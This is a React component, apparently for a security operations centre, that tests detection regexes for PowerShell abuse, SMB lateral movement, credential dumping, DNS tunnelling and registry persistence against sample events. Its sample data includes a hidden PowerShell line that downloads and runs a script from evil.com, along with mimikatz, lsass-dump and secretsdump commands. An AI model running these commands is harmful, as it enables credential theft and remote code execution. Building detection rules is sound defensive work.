import { useState, useEffect, useRef } from "react";
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { ScrollArea } from "@/components/ui/scroll-area";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { Progress } from "@/components/ui/progress";
import { Separator } from "@/components/ui/separator";
import { 
  Play, 
  Pause, 
  Square, 
  RefreshCw, 
  Terminal, 
  Shield, 
  AlertTriangle, 
  CheckCircle, 
  XCircle, 
  Info,
  Zap,
  Target,
  Clock,
  Eye,
  Brain,
  Network,
  Search,
  FileText,
  Code,
  Activity
} from "lucide-react";

interface TestRule {
  id: string;
  name: string;
  description: string;
  severity: "critical" | "high" | "medium" | "low";
  category: string;
  pattern: string;
  testData: string[];
  expectedMatches: number;
  technique: string;
  mitreId: string;
}

interface TestLog {
  id: string;
  timestamp: Date;
  level: "info" | "warning" | "error" | "success";
  message: string;
  details?: string;
  phase: string;
  explanation?: string;
}

interface TestResult {
  ruleId: string;
  ruleName: string;
  matches: number;
  expectedMatches: number;
  success: boolean;
  executionTime: number;
  detailedResults: {
    testData: string;
    matched: boolean;
    explanation: string;
  }[];
}

export default function InteractiveRuleTesting() {
  const [isRunning, setIsRunning] = useState(false);
  const [isPaused, setIsPaused] = useState(false);
  const [progress, setProgress] = useState(0);
  const [logs, setLogs] = useState<TestLog[]>([]);
  const [selectedRule, setSelectedRule] = useState<string | null>(null);
  const [testResults, setTestResults] = useState<TestResult[]>([]);
  const [currentPhase, setCurrentPhase] = useState("");
  const logsEndRef = useRef<HTMLDivElement>(null);

  const testRules: TestRule[] = [
    {
      id: "rule-001",
      name: "Suspicious PowerShell Execution",
      description: "Detecta execução de PowerShell com parâmetros suspeitos que podem indicar atividade maliciosa",
      severity: "high",
      category: "Execution",
      pattern: "powershell.*(-enc|-encodedcommand|-nop|-noprofile|-w hidden)",
      testData: [
        "powershell.exe -encodedcommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0AA==",
        "cmd.exe /c dir",
        "powershell -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://evil.com/script.ps1')\"",
        "notepad.exe document.txt",
        "powershell.exe -ExecutionPolicy Bypass -File malicious.ps1"
      ],
      expectedMatches: 3,
      technique: "Command and Scripting Interpreter",
      mitreId: "T1059.001"
    },
    {
      id: "rule-002", 
      name: "Lateral Movement via SMB",
      description: "Identifica tentativas de movimentação lateral através de compartilhamentos SMB administrativos",
      severity: "critical",
      category: "Lateral Movement",
      pattern: "\\\\\\\\.*\\\\(admin\\$|c\\$|ipc\\$).*",
      testData: [
        "\\\\192.168.1.100\\admin$\\system32\\cmd.exe",
        "http://example.com/index.html",
        "\\\\WORKSTATION01\\c$\\Windows\\System32\\",
        "\\\\srv-dc01\\ipc$",
        "C:\\Users\\user\\Documents\\file.txt"
      ],
      expectedMatches: 3,
      technique: "SMB/Windows Admin Shares",
      mitreId: "T1021.002"
    },
    {
      id: "rule-003",
      name: "Credential Dumping Activity",
      description: "Detecta ferramentas conhecidas para extração de credenciais da memória do sistema",
      severity: "critical", 
      category: "Credential Access",
      pattern: "(mimikatz|procdump|lsass|secretsdump|ntds\\.dit)",
      testData: [
        "mimikatz.exe sekurlsa::logonpasswords",
        "normal_application.exe",
        "procdump.exe -ma lsass.exe lsass.dmp",
        "secretsdump.py domain/user@target",
        "backup_ntds.dit"
      ],
      expectedMatches: 4,
      technique: "LSASS Memory",
      mitreId: "T1003.001"
    },
    {
      id: "rule-004",
      name: "DNS Tunneling Detection",
      description: "Identifica possível exfiltração de dados através de queries DNS suspeitas",
      severity: "medium",
      category: "Exfiltration",
      pattern: "([a-f0-9]{20,})\\..*\\.(com|net|org)$",
      testData: [
        "af3d7b2c1e8f9a0b4d6e2c8f1a9b3e7d5c2f8a1b.malicious-domain.com",
        "www.google.com",
        "1234567890abcdef1234567890abcdef12345678.exfil.net",
        "legitimate-website.org",
        "data-f7e8d9c0b1a2f3e4d5c6b7a8f9e0d1c2b3a4f5e6d7c8b9a0.evil.org"
      ],
      expectedMatches: 3,
      technique: "Exfiltration Over Alternative Protocol",
      mitreId: "T1048.003"
    },
    {
      id: "rule-005",
      name: "Registry Persistence",
      description: "Detecta modificações suspeitas no registro para estabelecer persistência",
      severity: "high",
      category: "Persistence",
      pattern: "(HKEY_LOCAL_MACHINE|HKLM)\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run",
      testData: [
        "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\MaliciousApp",
        "HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\16.0\\Word",
        "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\BackdoorService",
        "HKEY_CLASSES_ROOT\\.txt\\shell\\open\\command",
        "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\TempService"
      ],
      expectedMatches: 2,
      technique: "Registry Run Keys / Startup Folder",
      mitreId: "T1547.001"
    }
  ];

  const addLog = (level: TestLog["level"], message: string, phase: string, details?: string, explanation?: string) => {
    const newLog: TestLog = {
      id: Math.random().toString(36).substr(2, 9),
      timestamp: new Date(),
      level,
      message,
      details,
      phase,
      explanation
    };
    setLogs(prev => [...prev, newLog]);
  };

  const runRuleTest = async (rule: TestRule): Promise<TestResult> => {
    const startTime = Date.now();
    
    addLog("info", `Iniciando teste da regra: ${rule.name}`, "Initialization", 
           `Regra ID: ${rule.id}\nCategoria: ${rule.category}\nSeveridade: ${rule.severity}`,
           "Esta fase inicializa o teste da regra de detecção. O sistema carrega a regra, verifica sua sintaxe e prepara o ambiente de teste.");

    addLog("info", `Carregando padrão regex: ${rule.pattern}`, "Pattern Loading",
           `MITRE ATT&CK: ${rule.mitreId}\nTécnica: ${rule.technique}`,
           "O padrão regex é carregado e compilado. Este padrão será usado para identificar atividades maliciosas nos dados de teste.");

    const regex = new RegExp(rule.pattern, "gi");
    let matches = 0;
    const detailedResults: TestResult["detailedResults"] = [];

    addLog("info", `Testando ${rule.testData.length} amostras de dados`, "Data Processing",
           "Processando dados de teste para verificar quantos correspondem ao padrão da regra",
           "Cada amostra de dados representa um evento real que poderia ocorrer em um ambiente de produção. O sistema analisa se cada evento corresponde ao comportamento malicioso definido na regra.");

    for (let i = 0; i < rule.testData.length; i++) {
      const testItem = rule.testData[i];
      const matched = regex.test(testItem);
      
      if (matched) {
        matches++;
        addLog("warning", `MATCH DETECTADO: ${testItem.substring(0, 50)}...`, "Pattern Matching",
               `Dados completos: ${testItem}\nPadrão correspondente: ${rule.pattern}`,
               "Esta amostra corresponde ao padrão suspeito. Em um ambiente real, isso geraria um alerta de segurança que seria investigado pelo analista SOC.");
      } else {
        addLog("success", `Dados benignos: ${testItem.substring(0, 50)}...`, "Pattern Matching",
               `Dados completos: ${testItem}`,
               "Esta amostra não corresponde ao padrão malicioso, sendo classificada como atividade normal do sistema.");
      }

      detailedResults.push({
        testData: testItem,
        matched,
        explanation: matched 
          ? `Este evento corresponde ao padrão ${rule.pattern} indicando possível atividade maliciosa relacionada à técnica MITRE ${rule.mitreId}`
          : "Este evento representa atividade normal do sistema e não gera alerta de segurança"
      });

      // Simula tempo de processamento
      await new Promise(resolve => setTimeout(resolve, 200));
    }

    const executionTime = Date.now() - startTime;
    const success = matches === rule.expectedMatches;

    if (success) {
      addLog("success", `Teste APROVADO: ${matches}/${rule.expectedMatches} detecções corretas`, "Validation",
             `Tempo de execução: ${executionTime}ms\nPrecisão: 100%`,
             "A regra funcionou conforme esperado. Em produção, ela detectaria corretamente as ameaças sem gerar falsos positivos excessivos.");
    } else {
      addLog("error", `Teste FALHOU: ${matches}/${rule.expectedMatches} detecções`, "Validation",
             `Tempo de execução: ${executionTime}ms\nPrecisão: ${(matches/rule.expectedMatches*100).toFixed(1)}%`,
             "A regra não performou conforme esperado. Isso pode indicar necessidade de ajuste no padrão ou calibração de sensibilidade.");
    }

    return {
      ruleId: rule.id,
      ruleName: rule.name,
      matches,
      expectedMatches: rule.expectedMatches,
      success,
      executionTime,
      detailedResults
    };
  };

  const startTesting = async () => {
    if (isRunning) return;
    
    setIsRunning(true);
    setIsPaused(false);
    setProgress(0);
    setLogs([]);
    setTestResults([]);

    addLog("info", "=== INICIANDO AMBIENTE DE TESTE DE REGRAS SOC ===", "System Startup",
           "Sistema inicializado com sucesso\nModo: Teste Completo\nUsuário: Analista SOC",
           "O Interactive Rule Testing Environment é uma ferramenta essencial para validar regras de detecção antes de implementá-las em produção. Isso evita falsos positivos e garante eficácia na detecção de ameaças.");

    const rulesToTest = selectedRule 
      ? testRules.filter(rule => rule.id === selectedRule)
      : testRules;

    addLog("info", `Selecionadas ${rulesToTest.length} regras para teste`, "Test Planning",
           `Regras: ${rulesToTest.map(r => r.name).join(", ")}`,
           "O planejamento de testes é crucial. Cada regra será testada individualmente com dados conhecidos para verificar sua precisão e eficiência.");

    for (let i = 0; i < rulesToTest.length; i++) {
      if (!isRunning || isPaused) break;

      const rule = rulesToTest[i];
      setCurrentPhase(`Testando: ${rule.name}`);
      
      addLog("info", `--- TESTE ${i + 1}/${rulesToTest.length}: ${rule.name} ---`, "Rule Testing",
             `Categoria MITRE: ${rule.category}\nID: ${rule.mitreId}`,
             "Cada regra representa uma técnica específica de ataque conforme catalogado no framework MITRE ATT&CK. Este framework é a referência mundial para compreender táticas e técnicas de adversários.");

      const result = await runRuleTest(rule);
      setTestResults(prev => [...prev, result]);

      const progressValue = ((i + 1) / rulesToTest.length) * 100;
      setProgress(progressValue);

      if (i < rulesToTest.length - 1) {
        addLog("info", "Preparando próximo teste...", "Transition", undefined,
               "Uma breve pausa entre testes permite ao sistema processar resultados e preparar o próximo conjunto de dados.");
        await new Promise(resolve => setTimeout(resolve, 500));
      }
    }

    setCurrentPhase("Teste Concluído");
    
    const totalTests = testResults.length + 1; // +1 for the current batch
    const successfulTests = testResults.filter(r => r.success).length + rulesToTest.filter(r => testResults.find(tr => tr.ruleId === r.id)?.success !== false).length;
    
    addLog("success", "=== TESTE COMPLETO FINALIZADO ===", "System Summary",
           `Testes executados: ${rulesToTest.length}\nSucesso: ${successfulTests}/${rulesToTest.length}\nEficiência geral: ${(successfulTests/rulesToTest.length*100).toFixed(1)}%`,
           "O relatório final mostra a eficácia geral das regras testadas. Estes resultados são fundamentais para decisões sobre implementação em ambiente de produção.");

    setIsRunning(false);
    setProgress(100);
  };

  const pauseResumeTesting = () => {
    setIsPaused(!isPaused);
    if (isPaused) {
      addLog("info", "Teste RETOMADO pelo usuário", "User Action", undefined,
             "O operador retomou o teste. Esta funcionalidade permite controle granular sobre o processo de validação.");
    } else {
      addLog("warning", "Teste PAUSADO pelo usuário", "User Action", undefined,
             "O operador pausou o teste. Esta é uma funcionalidade importante para análise detalhada de resultados intermediários.");
    }
  };

  const stopTesting = () => {
    setIsRunning(false);
    setIsPaused(false);
    addLog("error", "Teste INTERROMPIDO pelo usuário", "User Action", undefined,
           "O teste foi interrompido antes da conclusão. Os resultados parciais ainda são válidos para análise.");
  };

  const clearLogs = () => {
    setLogs([]);
    setTestResults([]);
    setProgress(0);
    setCurrentPhase("");
  };

  useEffect(() => {
    logsEndRef.current?.scrollIntoView({ behavior: "smooth" });
  }, [logs]);

  const getSeverityColor = (severity: string) => {
    switch (severity) {
      case "critical": return "text-red-400 bg-red-400/10 border-red-400/30";
      case "high": return "text-orange-400 bg-orange-400/10 border-orange-400/30";
      case "medium": return "text-yellow-400 bg-yellow-400/10 border-yellow-400/30";
      case "low": return "text-blue-400 bg-blue-400/10 border-blue-400/30";
      default: return "text-gray-400 bg-gray-400/10 border-gray-400/30";
    }
  };

  const getLogIcon = (level: string) => {
    switch (level) {
      case "info": return <Info className="w-4 h-4 text-blue-400" />;
      case "warning": return <AlertTriangle className="w-4 h-4 text-yellow-400" />;
      case "error": return <XCircle className="w-4 h-4 text-red-400" />;
      case "success": return <CheckCircle className="w-4 h-4 text-green-400" />;
      default: return <Info className="w-4 h-4 text-gray-400" />;
    }
  };

  return (
    <div className="p-6 space-y-6">
      <div className="flex items-center space-x-3 mb-6">
        <div className="w-10 h-10 bg-[var(--cyber-cyan)] rounded-lg flex items-center justify-center">
          <Terminal className="text-[var(--cyber-dark)] text-xl" />
        </div>
        <div>
          <h1 className="text-2xl font-orbitron font-bold text-[var(--cyber-cyan)]">Interactive Rule Testing Environment</h1>
          <p className="text-gray-400">Ambiente completo de validação de regras SOC com logs detalhados</p>
        </div>
      </div>

      <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
        {/* Control Panel */}
        <Card className="lg:col-span-1 bg-[var(--cyber-dark)] border-[var(--cyber-cyan)]/30">
          <CardHeader>
            <CardTitle className="flex items-center space-x-2 text-[var(--cyber-cyan)]">
              <Shield className="w-5 h-5" />
              <span>Painel de Controle</span>
            </CardTitle>
            <CardDescription>Configure e execute testes de regras</CardDescription>
          </CardHeader>
          <CardContent className="space-y-4">
            <div className="space-y-3">
              <label className="text-sm font-medium text-[var(--cyber-cyan)]">Selecionar Regra</label>
              <select 
                value={selectedRule || "all"} 
                onChange={(e) => setSelectedRule(e.target.value === "all" ? null : e.target.value)}
                className="w-full p-2 bg-[var(--cyber-steel)] border border-[var(--cyber-cyan)]/30 rounded text-white text-sm"
                disabled={isRunning}
              >
                <option value="all">Todas as Regras</option>
                {testRules.map(rule => (
                  <option key={rule.id} value={rule.id}>{rule.name}</option>
                ))}
              </select>
            </div>

            <Separator className="bg-[var(--cyber-cyan)]/20" />

            <div className="space-y-3">
              <div className="flex space-x-2">
                <Button 
                  onClick={startTesting}
                  disabled={isRunning}
                  className="flex-1 bg-[var(--cyber-cyan)] hover:bg-[var(--cyber-cyan)]/80 text-[var(--cyber-dark)]"
                >
                  <Play className="w-4 h-4 mr-2" />
                  Start Rule Testing
                </Button>
              </div>

              {isRunning && (
                <div className="flex space-x-2">
                  <Button 
                    onClick={pauseResumeTesting}
                    variant="outline"
                    className="flex-1 border-[var(--cyber-cyan)]/30 text-[var(--cyber-cyan)]"
                  >
                    {isPaused ? <Play className="w-4 h-4 mr-2" /> : <Pause className="w-4 h-4 mr-2" />}
                    {isPaused ? "Resume" : "Pause"}
                  </Button>
                  <Button 
                    onClick={stopTesting}
                    variant="outline"
                    className="flex-1 border-red-400/30 text-red-400"
                  >
                    <Square className="w-4 h-4 mr-2" />
                    Stop
                  </Button>
                </div>
              )}

              <Button 
                onClick={clearLogs}
                variant="outline"
                className="w-full border-[var(--cyber-cyan)]/30 text-[var(--cyber-cyan)]"
                disabled={isRunning}
              >
                <RefreshCw className="w-4 h-4 mr-2" />
                Clear Logs
              </Button>
            </div>

            {isRunning && (
              <div className="space-y-2">
                <div className="flex justify-between text-xs text-gray-400">
                  <span>Progresso</span>
                  <span>{progress.toFixed(0)}%</span>
                </div>
                <Progress value={progress} className="h-2" />
                {currentPhase && (
                  <p className="text-xs text-[var(--cyber-cyan)]">{currentPhase}</p>
                )}
              </div>
            )}
          </CardContent>
        </Card>

        {/* Main Testing Area */}
        <div className="lg:col-span-2 space-y-6">
          <Tabs defaultValue="logs" className="w-full">
            <TabsList className="grid w-full grid-cols-3">
              <TabsTrigger value="logs">Logs Detalhados</TabsTrigger>
              <TabsTrigger value="rules">Regras Disponíveis</TabsTrigger>
              <TabsTrigger value="results">Resultados</TabsTrigger>
            </TabsList>

            <TabsContent value="logs" className="space-y-4">
              <Card className="bg-[var(--cyber-dark)] border-[var(--cyber-cyan)]/30">
                <CardHeader>
                  <CardTitle className="flex items-center space-x-2 text-[var(--cyber-cyan)]">
                    <Terminal className="w-5 h-5" />
                    <span>Console de Logs</span>
                    <Badge variant="outline" className="ml-auto text-[var(--cyber-cyan)] border-[var(--cyber-cyan)]/30">
                      {logs.length} eventos
                    </Badge>
                  </CardTitle>
                </CardHeader>
                <CardContent>
                  <ScrollArea className="h-96 w-full">
                    <div className="space-y-2 font-mono text-sm">
                      {logs.map((log) => (
                        <div key={log.id} className="p-3 rounded bg-[var(--cyber-steel)]/20 border border-[var(--cyber-cyan)]/10">
                          <div className="flex items-start space-x-3">
                            {getLogIcon(log.level)}
                            <div className="flex-1 space-y-1">
                              <div className="flex items-center space-x-2">
                                <span className="text-xs text-gray-400">
                                  {log.timestamp.toLocaleTimeString()}
                                </span>
                                <Badge variant="outline" className="text-xs bg-[var(--cyber-cyan)]/10 text-[var(--cyber-cyan)] border-[var(--cyber-cyan)]/30">
                                  {log.phase}
                                </Badge>
                              </div>
                              <p className="text-white">{log.message}</p>
                              {log.details && (
                                <div className="text-xs text-gray-400 bg-[var(--cyber-steel)]/30 p-2 rounded mt-2">
                                  <pre className="whitespace-pre-wrap">{log.details}</pre>
                                </div>
                              )}
                              {log.explanation && (
                                <div className="text-xs text-[var(--cyber-cyan)] bg-[var(--cyber-cyan)]/5 p-2 rounded mt-2 border border-[var(--cyber-cyan)]/20">
                                  <div className="flex items-start space-x-2">
                                    <Brain className="w-3 h-3 mt-0.5 flex-shrink-0" />
                                    <p>{log.explanation}</p>
                                  </div>
                                </div>
                              )}
                            </div>
                          </div>
                        </div>
                      ))}
                      <div ref={logsEndRef} />
                    </div>
                  </ScrollArea>
                </CardContent>
              </Card>
            </TabsContent>

            <TabsContent value="rules" className="space-y-4">
              <div className="grid grid-cols-1 gap-4">
                {testRules.map((rule) => (
                  <Card key={rule.id} className="bg-[var(--cyber-dark)] border-[var(--cyber-cyan)]/30">
                    <CardHeader>
                      <div className="flex items-center justify-between">
                        <CardTitle className="text-[var(--cyber-cyan)] flex items-center space-x-2">
                          <Target className="w-5 h-5" />
                          <span>{rule.name}</span>
                        </CardTitle>
                        <Badge className={getSeverityColor(rule.severity)}>
                          {rule.severity.toUpperCase()}
                        </Badge>
                      </div>
                      <CardDescription>{rule.description}</CardDescription>
                    </CardHeader>
                    <CardContent className="space-y-3">
                      <div className="grid grid-cols-2 gap-4 text-sm">
                        <div>
                          <span className="text-gray-400">Categoria:</span>
                          <p className="text-[var(--cyber-cyan)]">{rule.category}</p>
                        </div>
                        <div>
                          <span className="text-gray-400">MITRE ATT&CK:</span>
                          <p className="text-[var(--cyber-cyan)]">{rule.mitreId}</p>
                        </div>
                      </div>
                      <div>
                        <span className="text-gray-400 text-sm">Padrão de Detecção:</span>
                        <code className="block mt-1 p-2 bg-[var(--cyber-steel)]/30 rounded text-xs text-[var(--cyber-cyan)] font-mono">
                          {rule.pattern}
                        </code>
                      </div>
                      <div>
                        <span className="text-gray-400 text-sm">Amostras de Teste: {rule.testData.length}</span>
                        <div className="mt-1 space-y-1">
                          {rule.testData.slice(0, 2).map((sample, index) => (
                            <code key={index} className="block p-2 bg-[var(--cyber-steel)]/20 rounded text-xs text-gray-300 font-mono">
                              {sample.length > 60 ? `${sample.substring(0, 60)}...` : sample}
                            </code>
                          ))}
                          {rule.testData.length > 2 && (
                            <p className="text-xs text-gray-400">... e mais {rule.testData.length - 2} amostras</p>
                          )}
                        </div>
                      </div>
                    </CardContent>
                  </Card>
                ))}
              </div>
            </TabsContent>

            <TabsContent value="results" className="space-y-4">
              {testResults.length > 0 ? (
                <div className="grid grid-cols-1 gap-4">
                  {testResults.map((result) => (
                    <Card key={result.ruleId} className="bg-[var(--cyber-dark)] border-[var(--cyber-cyan)]/30">
                      <CardHeader>
                        <div className="flex items-center justify-between">
                          <CardTitle className="text-[var(--cyber-cyan)] flex items-center space-x-2">
                            <Activity className="w-5 h-5" />
                            <span>{result.ruleName}</span>
                          </CardTitle>
                          <div className="flex items-center space-x-2">
                            {result.success ? (
                              <CheckCircle className="w-5 h-5 text-green-400" />
                            ) : (
                              <XCircle className="w-5 h-5 text-red-400" />
                            )}
                            <Badge variant={result.success ? "default" : "destructive"}>
                              {result.matches}/{result.expectedMatches}
                            </Badge>
                          </div>
                        </div>
                      </CardHeader>
                      <CardContent className="space-y-3">
                        <div className="grid grid-cols-3 gap-4 text-sm">
                          <div>
                            <span className="text-gray-400">Detecções:</span>
                            <p className="text-[var(--cyber-cyan)]">{result.matches}</p>
                          </div>
                          <div>
                            <span className="text-gray-400">Esperadas:</span>
                            <p className="text-[var(--cyber-cyan)]">{result.expectedMatches}</p>
                          </div>
                          <div>
                            <span className="text-gray-400">Tempo:</span>
                            <p className="text-[var(--cyber-cyan)]">{result.executionTime}ms</p>
                          </div>
                        </div>
                        <div className="space-y-2">
                          <span className="text-gray-400 text-sm">Resultados Detalhados:</span>
                          {result.detailedResults.map((detail, index) => (
                            <div key={index} className="p-2 bg-[var(--cyber-steel)]/20 rounded text-xs">
                              <div className="flex items-center space-x-2 mb-1">
                                {detail.matched ? (
                                  <AlertTriangle className="w-3 h-3 text-yellow-400" />
                                ) : (
                                  <CheckCircle className="w-3 h-3 text-green-400" />
                                )}
                                <code className="text-gray-300 font-mono">
                                  {detail.testData.length > 50 ? `${detail.testData.substring(0, 50)}...` : detail.testData}
                                </code>
                              </div>
                              <p className="text-gray-400 ml-5">{detail.explanation}</p>
                            </div>
                          ))}
                        </div>
                      </CardContent>
                    </Card>
                  ))}
                </div>
              ) : (
                <Card className="bg-[var(--cyber-dark)] border-[var(--cyber-cyan)]/30">
                  <CardContent className="text-center py-8">
                    <FileText className="w-12 h-12 text-gray-400 mx-auto mb-4" />
                    <p className="text-gray-400">Nenhum resultado disponível ainda.</p>
                    <p className="text-sm text-gray-500 mt-2">Execute um teste para ver os resultados detalhados.</p>
                  </CardContent>
                </Card>
              )}
            </TabsContent>
          </Tabs>
        </div>
      </div>
    </div>
  );
}